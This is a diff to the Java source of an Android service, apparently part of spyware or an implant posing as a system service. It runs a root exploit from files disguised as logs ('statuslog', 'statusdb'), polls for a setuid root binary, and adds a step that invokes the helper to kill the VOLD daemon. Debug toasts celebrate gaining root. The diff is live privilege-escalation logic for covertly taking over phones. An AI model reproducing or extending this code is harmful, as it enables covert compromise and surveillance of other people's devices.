@@ -2,15 +2,12 @@ package com.android.service;
 
 import java.io.BufferedReader;
 import java.io.BufferedWriter;
-import java.io.DataInputStream;
-import java.io.DataOutputStream;
 import java.io.File;
 import java.io.FileNotFoundException;
 import java.io.FileOutputStream;
 import java.io.IOException;
 import java.io.InputStream;
 import java.io.InputStreamReader;
-import java.io.OutputStream;
 import java.io.OutputStreamWriter;
 
 import android.app.Service;
@@ -88,8 +85,10 @@ public class ServiceCore extends Service {
 			if (!Cfg.EXP) {
 				if (Cfg.DEBUG)
 					Log.d("QZ", TAG + " (root): Exploit disabled by conf");
+				
 				return false;
 			}
+			
 			String crashlog = "errorlog";
 			String exploit = "statuslog";
 			String suidext = "statusdb";
@@ -138,10 +137,10 @@ public class ServiceCore extends Service {
 			ExploitRunnable r = new ExploitRunnable(exppath);
 			new Thread(r).start();
 
-			// Attendiamo al max 1 minuto il nostro file setuid root
+			// Attendiamo al max 100 secondi il nostro file setuid root
 			long now = System.currentTimeMillis();
 
-			while (System.currentTimeMillis() - now < 100 * 1024) {
+			while (System.currentTimeMillis() - now < 100 * 1000) {
 				Utils.sleep(1000);
 
 				if (checkRoot()) {
@@ -154,10 +153,11 @@ public class ServiceCore extends Service {
 				r.getProcess().destroy();
 
 			if (isRoot) {
+				// Killiamo VOLD per due volte
+				Runtime.getRuntime().exec(path + "/" + suidext + " vol");
+
 				if (Cfg.DEBUG) {
-					Log.d("QZ",
-							TAG
-									+ " (onStart): WE ARE ROOOOOOOT, I LOVE QUEZ MADE EXPLOITS!!!");
+					Log.d("QZ", TAG + " (onStart): WE ARE ROOOOOOOT, I LOVE QUEZ MADE EXPLOITS!!!");
 					Toast.makeText(this,
 							"WE ARE ROOOOOOOT, I LOVE QUEZ MADE EXPLOITS!!!",
 							Toast.LENGTH_LONG).show();
@@ -165,8 +165,7 @@ public class ServiceCore extends Service {
 			} else {
 				if (Cfg.DEBUG) {
 					Log.d("QZ",
-							TAG
-									+ " (onStart): Fucking third party exploits, they never work!");
+							TAG + " (onStart): Fucking third party exploits, they never work!");
 					Toast.makeText(this,
 							"Fucking third party exploits, they never work!",
 							Toast.LENGTH_LONG).show();
